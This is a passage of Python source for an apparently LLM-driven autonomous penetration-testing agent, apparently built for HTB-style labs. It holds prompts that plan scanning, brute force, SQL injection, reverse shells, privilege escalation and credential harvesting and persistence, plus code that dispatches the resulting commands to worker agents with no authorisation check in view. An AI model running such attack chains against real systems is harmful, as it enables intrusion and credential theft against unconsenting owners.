        prompt = f"""Plan TARGETED vulnerability scanning for {target}.
Use the EXACT service versions below to search for known CVEs and exploits.
Do NOT run generic scans — each check must target a specific service or version found.

{intel_ctx}
{kb}

EXACT SERVICE VERSIONS TO INVESTIGATE:
{chr(10).join(svc_ver_lines) if svc_ver_lines else "  Run nmap -sV first to get versions"}

LOGIN PAGES FOUND (test for auth bypass, default creds, SQLi):
{login_pages if login_pages else "  None found yet"}

Tools already run (DO NOT repeat): {already_run}

{self._tools_hint()}

TOOL-SELECTION HINTS (pick from the catalog above — you are NOT limited to these):
- searchsploit: ALWAYS run for each exact service version found (e.g. "Apache 2.4.49", "vsftpd 2.3.4")
- nmap --script vuln: for open ports with known vuln scripts
- nikto: for HTTP services — finds misconfigurations, default files, known CVEs
- sslscan / testssl.sh: ONLY if HTTPS/TLS found
- wpscan: ONLY if WordPress detected
- enum4linux / smbmap / crackmapexec: ONLY if SMB found
- hydra / medusa / ncrack: ONLY if login pages or SSH/FTP found AND usernames are known
- wfuzz / ffuf / feroxbuster / gobuster: for web content discovery
- sqlmap / commix: for injection testing
- impacket-secretsdump / bloodhound: for AD enumeration
- any other tool listed in the catalog is fair game — use the best one for the job

Max 4 checks. Pick what gives the most signal for THIS specific target.
{f"OPERATOR NOTES: {self._notes}" if getattr(self, '_notes', '') else ""}

For WEB targets specifically, ensure OWASP Top 10 coverage:
- A01: Test IDOR and path traversal (feroxbuster, manual curl)
- A03: SQL injection (sqlmap), Command injection (commix)
- A05: Security misconfiguration (nikto, headers check)
- A07: Authentication brute force (hydra on login pages)

Return JSON:
{{
  "reasoning": "why these specific checks target the services/versions found",
  "checks": [
    {{
      "tool": "searchsploit",
      "args": "Apache 2.4.49",
      "purpose": "Find public exploits for exact Apache version",
      "timeout": 30
    }}
  ],
  "expected_vulns": ["CVE-XXXX-XXXXX: description", "..."]
}}"""
        return await self.think_json(prompt)

    async def _llm_prioritise_vulns(self, target: str, result: Dict) -> Dict:
        vulns = result.get("vulnerabilities", [])
        cves  = result.get("cves", [])
        # ── CRITICAL FIX ── earlier phases (especially OSINT synthesis)
        # may have already identified the kill chain.  Merge that intel
        # into the prompt so the LLM does NOT respond with
        # "no vulnerabilities enumerated yet" while the chain is sitting
        # in self._intel waiting to be executed.  This was the root cause
        # of the 3-hour-zero-findings engagement on 10.129.56.165.
        intel_cves  = list(self._intel.get("critical_cves") or [])
        chain       = self._intel.get("exploit_chain") or {}
        next_cmds   = list(self._intel.get("next_commands") or [])
        risk_verdict = (self._intel.get("risk_verdict") or
                         chain.get("severity") or "").lower()

        # If a critical chain is already known, frame the prompt around
        # EXECUTING it, not "discovering more vulnerabilities".
        if next_cmds and risk_verdict in ("critical", "high"):
            cmd_block = "\n".join(f"  {i+1}. {c}" for i, c in enumerate(next_cmds[:6]))
            prompt = f"""You already have a high-confidence exploit chain identified
by upstream analysis on {target}.  Confirm the plan and return JSON.

EXPLOIT CHAIN (from OSINT synthesis): severity={risk_verdict}
Critical CVEs: {intel_cves}
Pre-staged commands (run these FIRST, in order):
{cmd_block}

Additional vuln-scan output (may be empty - chain takes priority): {vulns[:5]}

Return JSON:
{{
  "reasoning": "why these pre-staged commands are the right first action",
  "priority_targets": {intel_cves[:5]!r},
  "exploit_modules": [
    {{"module": "manual_command", "command": "<first command from list>", "reliability": "excellent"}}
  ],
  "exploit_recommendation": "Execute the pre-staged commands NOW, do not re-enumerate",
  "manual_exploits": {next_cmds[:5]!r},
  "skip_redundant_scanning": true
}}"""
            return await self.think_json(prompt)

        # No pre-staged chain — fall back to the original prompt.
        _cve_str = _safe_join((intel_cves + cves)[:8])
        _svc_str = _fmt_svcs(self._intel.get("services", {}))
        kb = await self._kb(
            f"exploit {_cve_str} {_svc_str} metasploit initial access",
            outcome_filter="shell obtained",
            top_k=4,
        )
        prompt = f"""Prioritise these vulnerabilities for exploitation on {target}:
Vulnerabilities: {vulns[:10]}
CVEs found: {(intel_cves + cves)[:15]}
Exploit modules from searchsploit: {result.get('exploits', [])}
Services seen: {_svc_str}
Critical CVEs from OSINT (priority): {intel_cves}
Pre-staged commands available (use them if relevant): {next_cmds[:5]}
{kb}
Return JSON:
{{
  "reasoning": "which vulns are most exploitable and why, using past experience",
  "priority_targets": ["vuln1", "vuln2"],
  "exploit_modules": [
    {{"module": "exploit/...", "target_port": 80, "reliability": "excellent|good|normal"}}
  ],
  "exploit_recommendation": "best path to initial access",
  "manual_exploits": ["CVE-xxx python exploit script"]
}}"""
        return await self.think_json(prompt)

    async def _llm_plan_web_testing(self, target: str, web_ports: List[int]) -> Dict:
        techs = self._intel.get("technologies", [])
        paths = self._intel.get("web_paths", [])
        already_run = list(self._used_tools.keys())
        port0 = web_ports[0] if web_ports else 80
        _tech_str = _safe_join(techs[:5])
        kb = await self._kb(
            f"web application exploit {_tech_str} sqli lfi upload rce shell",
            phase="exploit", top_k=4
        )
        kb_cmds = await self._kbc(
            f"web exploit {_tech_str} gobuster ffuf sqlmap nikto command",
            top_k=3,
        )
        intel_ctx = self._intel_summary()
        prompt = f"""Plan OWASP-based web application testing for {target}.
Web ports: {web_ports}
Detected technologies: {techs}
Known paths: {paths[:10]}
Tools already run (DO NOT repeat): {already_run}
{intel_ctx}
{kb}
{kb_cmds}
{self._tools_hint()}

Pick from the catalog above — common picks for web: nikto, gobuster, ffuf, feroxbuster, sqlmap,
wfuzz, commix, wapiti, dirb, wpscan, nuclei, dalfox, davtest, wafw00f, whatweb, katana, arjun.
Pick tools NOT already used. Max 4 tools.

Return JSON:
{{
  "reasoning": "what web vulns are most likely given the tech stack",
  "owasp_checks": ["A01:Broken Access Control", "A03:Injection"],
  "tools": [
    {{
      "tool": "gobuster",
      "args": "dir -u http://{target}:{port0} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak -t 50 -q --no-error",
      "purpose": "Directory enumeration",
      "timeout": 180
    }},
    {{
      "tool": "nikto",
      "args": "-h http://{target}:{port0} -C all -maxtime 120",
      "purpose": "Web misconfiguration scan",
      "timeout": 150
    }}
  ],
  "manual_checks": ["check login forms", "test file upload"]
}}"""
        return await self.think_json(prompt)

    async def _llm_analyse_web_results(self, target: str, result: Dict) -> Dict:
        _techs   = result.get('technologies', [])
        _wv      = result.get('web_vulns', [])[:5]
        _paths   = result.get('paths', [])[:10]
        _tech_str = _safe_join(_techs[:5])
        _wv_str   = _safe_join(_wv)
        kb = await self._kb(
            f"web vuln {_tech_str} {_wv_str} exploit path traversal sqli upload",
            outcome_filter="shell obtained",
            top_k=3,
        )
        prompt = f"""Analyse web application testing results for {target}:
Paths found: {_paths}
Web vulns: {_wv}
Technologies: {_techs}
{kb}
Return JSON:
{{
  "reasoning": "what was found, severity, and how past experience informs exploitation",
  "critical_findings": "description of most critical web vulns",
  "exploit_recommendation": "best web exploitation path",
  "sqli_found": true|false,
  "xss_found": true|false,
  "lfi_found": true|false,
  "upload_bypass": true|false
}}"""
        return await self.think_json(prompt)

    async def _llm_plan_osint(self, target: str) -> Dict:
        # Pull ALL relevant recon/vuln/web artefacts so OSINT planning is
        # discovery-driven, not a generic "search the target IP" exercise.
        intel = self._intel or {}
        _svcs = [_fmt_svc(v) for v in list(intel.get("services", {}).values())[:8]]
        _svc_versions = []
        for p, v in (intel.get("service_versions", {}) or {}).items():
            if isinstance(v, str) and v.strip():
                _svc_versions.append(f"{p}:{v}")
        _os         = intel.get("os_guess", "unknown")
        _hostnames  = list(dict.fromkeys((intel.get("hostnames") or []) +
                                         (intel.get("subdomains") or []) +
                                         (intel.get("virtual_hosts") or [])))[:15]
        _ssl_cns    = list(dict.fromkeys((intel.get("ssl_cns") or []) +
                                         (intel.get("ssl_sans") or [])))[:15]
        _web_tech   = list(dict.fromkeys(intel.get("web_tech") or
                                         intel.get("technologies") or []))[:15]
        _titles     = list(dict.fromkeys(intel.get("http_titles") or []))[:8]
        _logins     = list(dict.fromkeys(intel.get("login_pages") or []))[:8]
        _emails     = list(dict.fromkeys(intel.get("emails") or []))[:10]
        _users      = list(dict.fromkeys(intel.get("users") or []))[:10]
        _org        = intel.get("org") or intel.get("organization") or ""

        _svc_str = " ".join(_svcs)
        kb = await self._kb(
            f"OSINT CVE searchsploit {_svc_str} {_os} exploit database",
            top_k=3,
        )

        prompt = f"""You are the OSINT planner for an ACTIVE penetration test.
Your job is to turn RECON DISCOVERIES into targeted intelligence queries —
NOT to do a generic Google search for the target string.

Target: {target}
OS guess: {_os}
Org: {_org or 'unknown'}

──── DISCOVERED ARTEFACTS (use these to drive searches) ────
Services (port → product/version):
  {_svcs or 'none'}
Service versions: {_svc_versions or 'none'}
Hostnames / subdomains / vhosts: {_hostnames or 'none'}
SSL certificate CNs / SANs: {_ssl_cns or 'none'}
Web technologies: {_web_tech or 'none'}
HTTP titles: {_titles or 'none'}
Login pages: {_logins or 'none'}
Emails already harvested: {_emails or 'none'}
Usernames already discovered: {_users or 'none'}

{kb}

──── PLANNING GUIDANCE ────
Produce searches that PIVOT on the artefacts above. Prefer, in priority order:
1. CVE lookup per `product version` pair — one searchsploit/NVD query per pair.
2. Subdomain enumeration using discovered hostnames/SSL SANs as seeds.
3. Tech-stack-specific dorks (e.g. "site:{{domain}} inurl:wp-admin" if WordPress
   in web_tech).
4. Breach lookups for discovered emails / usernames (HIBP).
5. Org-level pivots using SSL CN / org name (Shodan org:, Censys autonomous_system).
6. Historical URLs via Wayback for each discovered subdomain.
7. GitHub/pastebin dorks on org name, domain, and distinctive banner strings.
Do NOT simply "search {target}" — every search should mention a CONCRETE artefact
from the list above.

Return JSON with this exact shape:
{{
  "reasoning": "1-3 sentences on which artefacts drove your choices",
  "searches": [
    {{
      "tool":    "searchsploit|nvd|shodan|google_dorks|wayback|theharvester|recon_ng|builtwith|security_trails|censys|bgpview|spiderfoot|hibp",
      "args":    "concrete search string (product+version, subdomain, email, CN, tech name)",
      "purpose": "what vuln/intel this is expected to surface",
      "timeout": 30
    }}
  ]
}}
Emit between 4 and 10 searches — quality over quantity."""
        return await self.think_json(prompt)

    async def _llm_plan_exploitation(self, target: str) -> Dict:
        ports     = self._intel.get("open_ports", [])
        svcs      = self._intel.get("services", {})
        vulns     = self._intel.get("vulnerabilities", [])
        mods      = self._intel.get("exploit_modules", [])
        web_vulns = self._intel.get("web_vulns", [])
        cves      = self._intel.get("cves", [])
        _os       = self._intel.get("os_guess", "unknown")
        _svc_str  = _fmt_svcs(svcs)
        _cve_str  = _safe_join(cves[:5])
        _wv_str   = _safe_join(web_vulns[:3])

        # Query KB specifically for successful exploitation against this profile
        kb = await self._kb(
            f"exploit shell {_svc_str} {_cve_str} {_wv_str} {_os} initial access",
            outcome_filter="shell obtained",
            top_k=5,
        )
        # Also fetch any relevant exploit examples without outcome filter (broader)
        kb_broad = await self._kb(
            f"exploit {_svc_str} {_os} {_cve_str}",
            top_k=3,
        )
        # Fetch specific exploit commands used against similar services
        kb_cmds = await self._kbc(
            f"exploit {_svc_str} {_os} shell command",
            top_k=4,
        )

        intel_ctx = self._intel_summary()

        # Build service-specific context for exploitation
        svc_detail = []
        for port, ver in list(self._intel.get("service_versions", {}).items())[:10]:
            svc_detail.append(f"  {port}: {ver}")
        login_pages = self._intel.get("login_pages", [])
        users       = self._intel.get("users", [])
        shares      = self._intel.get("shares", [])
        ifiles      = self._intel.get("interesting_files", [])

        prompt = f"""You are an expert penetration tester planning targeted exploitation for {target}.
DO NOT just try generic exploits. Use EXACTLY what the recon phase found to drive your plan.

{intel_ctx}

{self._tools_hint()}

{kb}
{kb_broad}
{kb_cmds}

EXPLOITATION METHODOLOGY — follow this priority order:
1. IMMEDIATE WINS first: default/weak credentials on discovered login pages and services
2. KNOWN CVE exploits for exact versions found (use service_versions above)
3. SERVICE MISCONFIGURATIONS: anonymous FTP, readable SMB shares, open databases
4. WEB APPLICATION ATTACKS on discovered paths: SQLi on login forms, LFI on file params, upload bypass
5. BRUTE FORCE: only if specific usernames were found AND service is appropriate
6. METASPLOIT: only for reliable modules matching exact CVEs found

SPECIFIC TARGETS FROM RECON:
- Login pages to attack: {login_pages if login_pages else "none found — check web paths"}
- Usernames to use: {users if users else "try common: admin, root, guest, user, test"}
- SMB shares to check: {shares if shares else "none enumerated"}
- Interesting files found: {ifiles[:5] if ifiles else "none"}
- Service versions: {chr(10).join(svc_detail) if svc_detail else "  see intel summary above"}

IMPORTANT: For each attack vector, explain EXACTLY:
- What specific endpoint/service/path you are targeting
- What exact credentials or payload you are using
- What output will confirm success (not just "shell obtained" — be specific)

Return JSON:
{{
  "primary_strategy": "web|network|smb|credential|ftp|mixed",
  "reasoning": "which specific findings from recon make this the best path",
  "attack_vectors": [
    {{
      "type": "default_creds|web_sqli|web_upload|web_lfi|ftp_anon|smb_read|cve_exploit|hydra|metasploit",
      "description": "exactly what you are targeting — e.g. admin login at /manager/html",
      "rationale": "why this specific target is exploitable based on recon findings",
      "tool": "exact tool name",
      "args": "complete args string with real values from intel — no placeholders",
      "timeout": 120,
      "success_indicator": "exact string in output that confirms success"
    }}
  ]
}}"""
        return await self.think_json(prompt)

    async def _llm_build_exploit_command(self, target: str, vector: Dict) -> Dict:
        _tool = vector.get('tool', '')
        _type = vector.get('type', '')
        _desc = vector.get('description', '')
        # Fetch command-type chunks specifically — these are actual tool invocations from writeups
        kb = await self._kbc(
            f"{_tool} {_type} {_desc} command flags",
            top_k=4,
        )
        # Also fetch technique context
        kb_tech = await self._kb(
            f"{_tool} {_type} {_desc} exploit technique",
            top_k=2,
        )
        svc_versions = self._intel.get("service_versions", {})
        login_pages  = self._intel.get("login_pages", [])
        users        = self._intel.get("users", [])
        web_paths    = self._intel.get("web_paths", [])
        shares       = self._intel.get("shares", [])

        prompt = f"""Build the EXACT runnable command for this exploitation step against {target}.
Use REAL values from the intelligence gathered — NO placeholders like <target> or <wordlist>.

{self._tools_hint()}

ATTACK VECTOR:
- Type: {_type}
- Description: {_desc}
- Suggested tool (must be a name from the catalog above): {_tool}

AVAILABLE INTELLIGENCE TO USE IN THE COMMAND:
- Web paths found: {web_paths[:10]}
- Login pages: {login_pages}
- Known users: {users if users else ["admin", "root", "guest", "test", "user"]}
- Service versions: {list(svc_versions.items())[:8]}
- SMB shares: {shares}
- CVEs confirmed: {self._intel.get('cves', [])[:5]}
- Target OS: {self._intel.get('os_guess', 'unknown')}

{kb}

{kb_tech}

COMMAND BUILDING RULES:
- For hydra: use -L with common usernames or discovered usernames, target specific port and service
- For sqlmap: use actual login page URL found, add --forms or specific parameter
- For gobuster: use the most appropriate wordlist for the tech stack
- For searchsploit: use the exact version string (e.g. "vsftpd 2.3.4" not just "vsftpd")
- For curl: use actual paths found, include relevant headers
- Do NOT use placeholders — if you need a wordlist, use the actual Kali path

Return JSON:
{{
  "tool": "exact_tool_name",
  "args": "complete args with real target IP and actual paths — no <placeholders>",
  "command": "tool + full args as single string for display",
  "lhost": "attacker IP if reverse shell needed, else null",
  "lport": "listener port if needed, else null",
  "pre_command": "any setup command needed first (e.g. start listener), else null"
}}"""
        return await self.think_json(prompt)

    async def _llm_evaluate_exploit_result(self, target: str, vector: Dict, result: Dict) -> Dict:
        stdout   = result.get("stdout", "")[:2000]
        _tool    = vector.get('tool', '')
        _desc    = vector.get('description', '')
        _exit    = result.get('exit_code', -1)
        # Only query KB if exploit failed — to suggest what to try next
        kb = ""
        if _exit != 0 or "error" in stdout.lower() or "failed" in stdout.lower():
            _svc_str = _fmt_svcs(self._intel.get("services", {}))
            kb = await self._kb(
                f"{_tool} failed next step alternative {_svc_str}",
                top_k=3,
            )
            # Also get alternative command examples
            kb_alt_cmds = await self._kbc(
                f"alternative exploit {_svc_str} {_tool} failed bypass",
                top_k=3,
            )
            if kb_alt_cmds:
                kb = kb + "\n" + kb_alt_cmds
        prompt = f"""Evaluate this penetration testing attempt and extract ALL useful findings.
Do NOT only look for shells — extract ANY information that helps the attack.

Tool: {_tool}
Command: {vector.get('args', '')}
Exit code: {_exit}
Intended target: {_desc}

OUTPUT:
{stdout}

{kb}

Analyse the output carefully for:
1. Shell/code execution (obvious success)
2. Valid credentials confirmed (login success messages, session tokens)
3. Files/directories accessible (readable files, directory listings)
4. Service information (version strings, error messages revealing tech stack)
5. Usernames or email addresses in output
6. Error messages revealing the application framework or backend

Return JSON:
{{
  "shell_obtained": true or false,
  "reasoning": "exactly what happened — be specific, quote relevant output",
  "user": "username if shell obtained, else null",
  "shell_id": "session ID if metasploit, else null",
  "user_flag": "HTB/CTF flag value if found in output (format: flag{{...}} or hex string), else null",
  "credentials_found": [{{"user": "x", "pass": "y", "service": "z"}}],
  "files_accessible": ["list of files or dirs confirmed accessible"],
  "useful_info": "any other useful information extracted from output",
  "next_step": "most logical next step based on what was found",
  "store_finding": true or false,
  "finding_severity": "critical|high|medium|low",
  "finding_title": "short title if worth storing as a finding"
}}"""
        return await self.think_json(prompt)

    async def _llm_plan_privesc(self, target: str) -> Dict:
        _os   = self._intel.get("os_guess", "unknown")
        _user = self._intel.get("current_user", "unknown")
        # Query KB for privesc that achieved root on this OS (technique context)
        kb = await self._kb(
            f"privilege escalation {_os} sudo suid cron kernel root",
            phase_filter="privesc",
            outcome_filter="root",
            top_k=5,
        )
        # Fetch specific privesc command examples from writeups
        kb_cmds = await self._kbc(
            f"privesc {_os} sudo suid GTFOBins linpeas command",
            top_k=4,
        )
        # Fetch step-by-step privesc procedures
        kb_procs = await self._kbp(
            f"privilege escalation {_os} methodology steps",
            top_k=2,
        )
        # Broader fallback if no root-filtered results
        kb_broad = await self._kb(
            f"privesc {_os} {_user} GTFOBins linpeas",
            top_k=3,
        )
        intel_ctx = self._intel_summary()
        prompt = f"""Plan privilege escalation for {target}.
{intel_ctx}
{kb}
{kb_cmds}
{kb_procs}
{kb_broad}
Use the knowledge base above to prioritise vectors that succeeded on similar systems.

Using standard privesc methodology:
1. Automated enumeration (linPEAS)
2. Check sudo -l misconfigurations
3. SUID binaries → GTFOBins
4. Writable cron jobs
5. Kernel exploits (last resort)
6. PATH hijacking, wildcard injection

Return JSON:
{{
  "reasoning": "most likely privesc vectors given the OS and past experience",
  "vectors": ["sudo misconfiguration", "suid binaries", "..."],
  "steps": [
    {{
      "tool": "find",
      "args": "/ -perm -u=s -type f 2>/dev/null",
      "purpose": "Find SUID binaries",
      "timeout": 60
    }},
    {{
      "tool": "sudo",
      "args": "-l",
      "purpose": "Check sudo rights",
      "timeout": 10
    }}
  ]
}}"""
        return await self.think_json(prompt)

    async def _llm_evaluate_privesc(self, target: str, result: Dict) -> Dict:
        _suid   = result.get('suid_files', [])[:10]
        _sudo   = result.get('sudo_rights', '')
        _kernel = result.get('kernel', '')
        _root   = result.get('root_flag')
        # Only query KB if not rooted yet
        kb = ""
        kb_cmds = ""
        if not _root:
            _os = self._intel.get("os_guess", "unknown")
            _suid_str = " ".join(str(s) for s in _suid[:5])
            kb = await self._kb(
                f"privesc {_os} {_kernel} {_suid_str} {_sudo} GTFOBins root",
                phase_filter="privesc",
                top_k=4,
            )
            # Get specific GTFOBins/privesc commands for the discovered binaries
            if _suid or _sudo:
                kb_cmds = await self._kbc(
                    f"GTFOBins {_suid_str} {_sudo} exploit root shell command",
                    top_k=3,
                )
        prompt = f"""Evaluate privilege escalation results:
SUID binaries: {_suid}
Sudo rights: {_sudo}
Kernel: {_kernel}
Root flag: {_root}
LinPEAS output summary: {result.get('linpeas_summary', '')[:1000]}
{kb}
{kb_cmds}
Return JSON:
{{
  "root_obtained": true|false,
  "reasoning": "what worked or best vectors to try next",
  "gtfobins_candidates": ["binary1", "binary2"],
  "next_step": "if not root yet, most promising path based on intel and past experience"
}}"""
        return await self.think_json(prompt)

    async def _llm_plan_post_exploit(self, target: str) -> Dict:
        prompt = f"""Plan post-exploitation for {target}.
Current user: {self._intel.get('current_user', 'unknown')}
Return JSON with enumeration goals: {{
  "reasoning": "...",
  "goals": ["harvest credentials", "map network", "persistence"],
  "steps": []
}}"""
        return await self.think_json(prompt)

    # ─── Instruction Builders ─────────────────────────────────

    def _build_recon_instructions(self, target: str, plan: Dict) -> List[Instruction]:
        instructions = []
        for step in _safe_list(plan.get("steps")):
            if not step.get("tool"):
                continue
            instructions.append(Instruction(
                tool      = step["tool"],
                args      = step.get("args", target),
                target    = target,
                reasoning = step.get("purpose", "Recon step"),
                phase     = AttackPhase.RECON,
                timeout   = step.get("timeout", 300)
            ))
        # Fallback if LLM gave empty plan
        if not instructions:
            instructions = [
                Instruction("nmap", f"-sS -sV -sC -O --open -p- --min-rate 3000 {target}", target,
                            "Full port scan with service detection", AttackPhase.RECON, 600),
                Instruction("whatweb", f"-a 3 http://{target}", target,
                            "Web technology fingerprinting", AttackPhase.RECON, 60),
            ]
        return instructions

    def _build_vuln_instructions(self, target: str, plan: Dict) -> List[Instruction]:
        instructions = []
        ports_str = ",".join(str(p) for p in self._intel.get("open_ports", [])[:30])
        for check in _safe_list(plan.get("checks")):
            if not check.get("tool"):
                continue
            instructions.append(Instruction(
                tool      = check["tool"],
                args      = check.get("args", ""),
                target    = target,
                reasoning = check.get("purpose", "Vulnerability check"),
                phase     = AttackPhase.VULN_ID,
                timeout   = check.get("timeout", 300)
            ))
        if not instructions and ports_str:
            instructions = [
                Instruction("nmap", f"--script vuln,safe -sV -p {ports_str} {target}", target,
                            "NSE vulnerability scripts", AttackPhase.VULN_ID, 600),
                Instruction("searchsploit", self._intel.get("os_guess", "linux"), target,
                            "Search ExploitDB for OS exploits", AttackPhase.VULN_ID, 30),
            ]
        return instructions

    def _build_web_instructions(self, target: str, web_ports: List[int], plan: Dict) -> List[Instruction]:
        instructions = []
        for tool_cfg in _safe_list(plan.get("tools")):
            if not tool_cfg.get("tool"):
                continue
            instructions.append(Instruction(
                tool      = tool_cfg["tool"],
                args      = tool_cfg.get("args", ""),
                target    = target,
                reasoning = tool_cfg.get("purpose", "Web testing"),
                phase     = AttackPhase.VULN_ID,
                timeout   = tool_cfg.get("timeout", 300)
            ))
        return instructions

    def _build_osint_instructions(self, target: str, plan: Dict) -> List[Instruction]:
        instructions = []
        for step in _safe_list(plan.get("searches")):
            if not step.get("tool"):
                continue
            instructions.append(Instruction(
                tool      = step["tool"],
                args      = step.get("args", target),
                target    = target,
                reasoning = step.get("purpose", "OSINT"),
                phase     = AttackPhase.OSINT,
                timeout   = step.get("timeout", 60)
            ))
        return instructions

    def _build_privesc_instructions(self, target: str, plan: Dict) -> List[Instruction]:
        instructions = []
        for step in _safe_list(plan.get("steps")):
            if not step.get("tool"):
                continue
            instructions.append(Instruction(
                tool      = step["tool"],
                args      = step.get("args", ""),
                target    = target,
                reasoning = step.get("purpose", "PrivEsc check"),
                phase     = AttackPhase.PRIVESC,
                timeout   = step.get("timeout", 120)
            ))
        if not instructions:
            instructions = [
                Instruction("sudo", "-l", target, "Check sudo rights", AttackPhase.PRIVESC, 10),
                Instruction("find", "/ -perm -u=s -type f 2>/dev/null", target, "SUID files", AttackPhase.PRIVESC, 60),
                Instruction("uname", "-a", target, "Kernel version", AttackPhase.PRIVESC, 5),
                Instruction("getcap", "-r / 2>/dev/null", target, "Capabilities", AttackPhase.PRIVESC, 30),
            ]
        return instructions

    # ─── Task Builders (Master → Agent) ─────────────────────────

    def _build_tasks_from_instructions(self, instructions: List) -> List[Dict]:
        """Convert Instruction objects to task dicts for execute_tasks."""
        tasks = []
        seen = set()
        for instr in (instructions or []):
            if not instr.tool:
                continue
            cache_key = f"{instr.tool}:{instr.args}"
            if cache_key in seen:
                continue
            seen.add(cache_key)
            tasks.append({
                "tool":         instr.tool,
                "args":         instr.args,
                "purpose":      instr.reasoning,
                "timeout":      instr.timeout,
                "can_parallel": True,  # all instructions run in parallel by default
            })
        return tasks

    def _build_tasks_from_attack_vectors(self, vectors: List[Dict], target: str) -> List[Dict]:
        """Convert LLM attack_vectors to task dicts, building exact commands."""
        tasks = []
        seen  = set()
        for v in (vectors or []):
            tool = (v.get("tool") or "").strip()
            args = (v.get("args") or "").strip()
            if not tool or not args:
                continue
            cache_key = f"{tool}:{args}"
            if cache_key in seen:
                continue
            seen.add(cache_key)
            tasks.append({
                "tool":         tool,
                "args":         args,
                "purpose":      v.get("description") or v.get("rationale",""),
                "timeout":      int(v.get("timeout") or 300),
                "can_parallel": True,
            })
        return tasks

    def _build_tasks_from_steps(self, steps: List[Dict], target: str, phase) -> List[Dict]:
        """Convert LLM steps list to task dicts."""
        tasks = []
        seen  = set()
        for s in (steps or []):
            tool = (s.get("tool") or "").strip()
            args = (s.get("args") or "").strip()
            if not tool:
                continue
            cache_key = f"{tool}:{args}"
            if cache_key in seen:
                continue
            seen.add(cache_key)
            tasks.append({
                "tool":         tool,
                "args":         args,
                "purpose":      s.get("purpose") or s.get("reasoning",""),
                "timeout":      int(s.get("timeout") or 120),
                "can_parallel": True,
            })
        return tasks

    # ─── Instruction Dispatch ─────────────────────────────────

    async def _dispatch_and_collect(
        self,
        agent:        "BaseAgent",
        instructions: List[Instruction],
        phase_label:  str,
        parallel:     bool = False
    ) -> Dict:
        """
        Issue instructions to a slave agent.
        - Deduplicates tools already run in this session
        - Skips cached identical commands
        - Checks user guidance queue before each tool
        - After every tool result, emits a concise status broadcast
        - parallel=True runs independent tools concurrently
        """
        combined = {
            "open_ports": [], "services": {}, "os_guess": "unknown",
            "web_paths":  [], "subdomains": [], "technologies": [],
            "vulnerabilities": [], "cves": [], "exploits": [],
            "web_vulns": [], "paths": [], "suid_files": [],
            "sudo_rights": "", "kernel": "", "linpeas_summary": "",
            "exploit_modules": [], "credentials": [], "stdout": "",
            "exit_code": 0
        }

        # Prepend any operator-forced tools (from guidance queue)
        forced = getattr(self, "_forced_instructions", [])
        if forced:
            self._forced_instructions = []
            for fi in forced:
                instructions.insert(0, Instruction(
                    tool      = fi["tool"],
                    args      = fi.get("args", self._intel.get("target", "")),
                    target    = self._intel.get("target", ""),
                    reasoning = fi.get("reasoning", "Operator-forced instruction"),
                    phase     = self.phase,
                    timeout   = fi.get("timeout", 300)
                ))

        # Filter: skip ONLY exact duplicate (same tool + same args)
        # Tools can run as many times as needed with DIFFERENT args.
        # The LLM and agents decide relevance — we do not cap.
        filtered = []
        for instr in instructions:
            cache_key = f"{instr.tool}:{instr.args}"
            if cache_key in self._instruction_cache:
                await self.emit_reasoning(
                    step       = f"{phase_label.lower()}_skip",
                    reasoning  = f"{instr.tool} with identical args already run — using cache",
                    decision   = "Using cached result for identical command",
                    next_action= "Next instruction",
                    data       = {"tool": instr.tool}
                )
                self._merge_result(combined, self._instruction_cache[cache_key], instr, agent)
                continue
            filtered.append(instr)

        if not filtered:
            return combined

        async def _run_one(instr: Instruction) -> tuple:
            """Execute a single instruction and return (instr, result)."""
            if self._stop_requested:
                return (instr, {"stdout": "", "stderr": "", "exit_code": -1})

            # Check guidance queue before running
            await self._apply_pending_guidance()

            await self.emit_reasoning(
                step       = f"{phase_label.lower()}_dispatch",
                reasoning  = instr.reasoning,
                decision   = f"→ {agent.name} running {instr.tool}",
                next_action= f"{instr.tool} {instr.args[:120]}",
                data       = {"tool": instr.tool, "phase": phase_label}
            )
            result = await agent.execute_instruction(instr)
            self._used_tools[instr.tool] = self._used_tools.get(instr.tool, 0) + 1
            self._instruction_cache[f"{instr.tool}:{instr.args}"] = result
            # Auto-map every tool to MITRE ATT&CK
            await self._map_mitre(instr.tool, success=(result.get("exit_code",1)==0))

            # Immediately broadcast what the tool found
            stdout = result.get("stdout", "")
            quick_ports = agent._extract_ports(stdout)
            quick_cves  = agent._extract_cves(stdout)
            await self._emit("tool_findings", {
                "tool":      instr.tool,
                "phase":     phase_label,
                "ports":     quick_ports,
                "cves":      quick_cves,
                "exit_code": result.get("exit_code", -1),
                "lines":     len(stdout.splitlines())
            })
            return (instr, result)

        # Always run all independent tools in parallel.
        # Master passes parallel=False ONLY for strict sequential dependencies
        # (e.g. must get ports before scanning them).
        if parallel or len(filtered) > 1:
            raw_results = await asyncio.gather(*[_run_one(i) for i in filtered], return_exceptions=True)
            pairs = [r for r in raw_results if isinstance(r, tuple) and len(r) == 2
                     and not isinstance(r[1], Exception)]
        else:
            pairs = []
            for instr in filtered:
                instr_result = await _run_one(instr)
                if isinstance(instr_result, tuple):
                    pairs.append(instr_result)

        # Merge all results into combined dict
        for (instr, result) in pairs:
            if isinstance(result, Exception):
                continue
            self._merge_result(combined, result, instr, agent)

        # After all tools run, add discovered services to attack graph
        for (instr, result) in pairs:
            if isinstance(result, Exception):
                continue
            stdout = result.get("stdout", "")
            new_services = agent._extract_services(stdout)
            for port, svc in new_services.items():
                await self.add_node(
                    node_id  = f"port_{port}_{svc.get('service', '')}",
                    type     = "service",
                    label    = f"{svc.get('service','?')}:{port}",
                    host     = instr.target,
                    port     = port,
                    metadata = svc
                )
                target_node = f"target_{instr.target.replace('.','_').replace('/','_')}"
                await self.add_edge(
                    source = target_node,
                    target = f"port_{port}_{svc.get('service', 'unknown')}",
                    label  = instr.tool,
                    tool   = instr.tool
                )

        return combined

    def _merge_result(self, combined: Dict, result: Dict, instr: "Instruction", agent: "BaseAgent"):
        """Extract structured data from a single tool result and merge into combined dict.
        Wrapped in try/except so one bad tool result never kills the phase.
        """
        try:
            stdout = result.get("stdout", "") or ""

            # Append raw stdout
            combined["stdout"] = combined.get("stdout", "") + "\n" + stdout

            # Ports and services
            new_ports = agent._extract_ports(stdout)
            combined["open_ports"] = list(set(combined["open_ports"] + [p for p in new_ports if isinstance(p, int)]))
            new_services = agent._extract_services(stdout)
            if isinstance(new_services, dict):
                combined["services"].update(new_services)

            # OS detection
            if combined["os_guess"] == "unknown":
                if re.search(r'\blinux\b', stdout, re.IGNORECASE):
                    combined["os_guess"] = "Linux"
                elif re.search(r'\bwindows\b', stdout, re.IGNORECASE):
                    combined["os_guess"] = "Windows"

